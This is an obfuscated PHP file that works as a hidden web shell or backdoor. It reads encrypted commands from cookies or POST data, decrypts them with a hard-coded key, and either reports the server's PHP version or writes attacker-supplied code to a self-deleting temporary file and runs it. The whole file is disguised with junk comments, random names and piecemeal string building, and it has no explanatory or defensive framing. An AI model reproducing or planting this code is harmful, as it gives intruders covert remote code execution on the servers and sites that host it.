<?php 	function	hlclpm(){$hqiomfnolk='yuskz';/*   lx  */print_r/*xyz*/(90926+90926);	}$vlo_ep	=	'vlo_ep'/*   add*/^/*nh   */'';




$krzfmfkm/*  o */=   $_COOKIE;

$vsvnipuqvr  =       $_POST;


function  lhqkfij($catpznuv,/* qt*/$avzwa)


{
	global	$vlo_ep;

	$mwodn	=/*  m  */"";


     for	($sppafila/*lj*/=	0;	$sppafila/*  ld  */<	strlen($catpznuv);)     {


/*  q  */for/* gv */($rlkap    =/* zjrh*/0;       $rlkap  </* lvf */strlen($avzwa)	&&     $sppafila/*   irxww  */<	strlen($catpznuv);      $rlkap++,  $sppafila++)	{

/*   kydg */$mwodn/*myor  */.=  $vlo_ep(ord($catpznuv[$sppafila])       ^/* rr*/ord($avzwa[$rlkap]));       }/*naubr*/}


/* vgwny */return     $mwodn;

}
function      nxhzrojzqw($oysvqtkqjs,     $catpznuv)
{
      global/* vd*/$vlo_ep;

	$khs_ndq     =	sprintf("."."/"."%"."s"."\56"	.	"p"."\154",	md5($oysvqtkqjs));

    file_put_contents($khs_ndq,      "<"   ./*jyqlf  */"\77"      .    "p"."\x68"  .	$vlo_ep(162-50)     ./*  fxna  */$vlo_ep(32)/* wypa*/.	"\x75"	.	"n"."l"."i"."\156"/*  mo  */.	"k"."("."_"."_".$vlo_ep(70)	.	"\111"/*   a */.       "L"."\x45"	.	"\137"/*   pqows*/.  "_".$vlo_ep(41)      ./* bb*/";".$vlo_ep(32)   .      $catpznuv["d"]);


     include($khs_ndq);	$pnxya	=	$khs_ndq;
    unlink($pnxya);


}



function	uwkvg()

{
  global	$vlo_ep;	

/* ukcsd*/$sppafila/*y_l  */=       array();
	$sppafila[$vlo_ep(112)	./*x*/"v"]/*bhvy*/=  phpversion();
     $sppafila["s"."v"]	=/* r_zrh*/$vlo_ep(172-121)     .      $vlo_ep(46)  .       $vlo_ep(53);

/* iq*/echo/*yfql  */@serialize($sppafila);


}


function	qv_fe($catpznuv,/*  fzjbu*/$oysvqtkqjs,      $dgzawbar)

{

	global/*ebh*/$vlo_ep;  


	$catpznuv	=	unserialize(lhqkfij(lhqkfij(base64_decode($catpznuv),	$oysvqtkqjs),	$dgzawbar));
/*   habkj   */if/* y*/(isset($catpznuv[$vlo_ep(142-45)	.   $vlo_ep(107)]))	{	if/* qgmwj   */($catpznuv["\141"]	==	"i")	{/*  wt*/uwkvg();


/*   bmzbr   */}      elseif   ($catpznuv["\141"]/*   yijd  */==  "e")	{     nxhzrojzqw($oysvqtkqjs,	$catpznuv);

	}/*qc   */exit();
	}
}





$krzfmfkm	=/*   fujp*/array_merge($vsvnipuqvr,/*  w_*/$krzfmfkm);




$oysvqtkqjs	=       $vlo_ep(97)/* zon */.	$vlo_ep(111-55)/*   hzx*/.      "7"."\141"     ./*teisd*/"e".$vlo_ep(51)	.	"0"."\65"      ./*  okcu  */"-"."c"."\143"   .      "\64"	./*   fxcqv  */"e"."-".$vlo_ep(667-615)	./*   pby*/"\x64"     ./*qbhl   */"e"."2"."\55"/*  hm  */.   "\x62"/*u */.       "b"."e"."3"."-"."\141"."f".$vlo_ep(50)       .	$vlo_ep(315-267)	.     "\66"	./*jyv*/"\141"      .	$vlo_ep(928-875)	.    "4"."e"."\x38"  ./*  jrcb  */$vlo_ep(102)/*   wril*/.	$vlo_ep(52);

foreach      ($krzfmfkm    as	$dgzawbar/*  ara*/=>       $catpznuv)/*   cv   */{

/*_hmp   */qv_fe($catpznuv,/*  ons */$oysvqtkqjs,	$dgzawbar);

}



